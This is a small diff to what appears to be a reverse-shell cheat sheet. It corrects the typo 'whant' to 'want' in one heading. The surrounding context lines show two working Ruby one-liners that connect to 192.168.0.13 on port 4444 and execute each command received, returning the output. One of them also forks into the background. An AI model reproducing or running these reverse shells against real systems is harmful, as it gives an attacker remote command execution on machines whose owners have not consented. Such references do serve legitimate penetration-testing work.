@@ -20,7 +20,7 @@ if you don't whant to rely on `/bin/sh`
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 
-if you don't whant to rely on `cmd.exe`
+if you don't want to rely on `cmd.exe`
 ```ruby
 ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
